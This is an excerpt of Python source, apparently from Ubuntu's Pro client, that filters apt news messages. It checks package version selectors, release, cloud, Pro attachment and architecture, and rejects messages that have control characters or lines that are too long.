    81	def _does_package_selector_apply(package_selector):
    82	    try:
    83	        package_name, version_operator, package_version = package_selector
    84	    except ValueError:
    85	        LOG.warning("Invalid package selector: %r", package_selector)
    86	        return False
    87	    installed_package_version = get_pkg_version(package_name)
    88	    if installed_package_version is None:
    89	        return False
    90	    version_comparison = version_compare(
    91	        installed_package_version, package_version
    92	    )
    93	    return any(
    94	        [
    95	            (
    96	                version_comparison == 0
    97	                and version_operator in ["==", "<=", ">="]
    98	            ),
    99	            (version_comparison < 0 and version_operator in ["<", "<="]),
   100	            (version_comparison > 0 and version_operator in [">", ">="]),
   101	        ]
   102	    )
   103	
   104	
   105	def do_selectors_apply(
   106	    cfg: UAConfig, selectors: Optional[AptNewsMessageSelectors]
   107	) -> bool:
   108	    if selectors is None:
   109	        return True
   110	
   111	    if selectors.codenames is not None:
   112	        if system.get_release_info().series not in selectors.codenames:
   113	            return False
   114	
   115	    if selectors.clouds is not None:
   116	        cloud_id, fail = get_cloud_type()
   117	        if fail is not None:
   118	            return False
   119	        if cloud_id not in selectors.clouds:
   120	            return False
   121	
   122	    if selectors.pro is not None:
   123	        if selectors.pro != _is_attached(cfg).is_attached:
   124	            return False
   125	
   126	    if selectors.architectures is not None:
   127	        if system.get_dpkg_arch() not in selectors.architectures:
   128	            return False
   129	
   130	    if selectors.packages is not None:
   131	        if not any(
   132	            [
   133	                _does_package_selector_apply(package_selector)
   134	                for package_selector in selectors.packages
   135	            ]
   136	        ):
   137	            return False
   138	
   139	    return True
   140	
   160	def is_control_char(c: str) -> bool:
   161	    return unicodedata.category(c)[0] == "C"
   162	
   163	
   164	def is_message_valid(msg: AptNewsMessage) -> bool:
   165	    if len(msg.lines) < 1:
   166	        return False
   167	    if len(msg.lines) > 3:
   168	        return False
   169	
   170	    for line in msg.lines:
   171	        if any([is_control_char(c) for c in line]):
   172	            return False
   173	        if len(line) > 77:
   174	            return False
   175	
   176	    return True
   177	
   178	
   179	def select_message(
   180	    cfg: UAConfig, messages: List[dict]
   181	) -> Optional[AptNewsMessage]:
   182	    for msg_dict in messages:
   183	        try:
   184	            msg = AptNewsMessage.from_dict(msg_dict)
   185	        except Exception as e:
   186	            LOG.debug("msg failed parsing: %r", e)
   187	            continue
   188	        if not is_message_valid(msg):
   189	            LOG.debug("msg not valid: %r", msg)
   190	            continue
   191	        if not do_dates_apply(msg.begin, msg.end):
   192	            LOG.debug("msg dates don't apply: %r", msg)
   193	            continue
   194	        if not do_selectors_apply(cfg, msg.selectors):
   195	            LOG.debug("msg selectors don't apply: %r", msg)
   196	            continue
   197	        return msg
   198	    return None
   199	
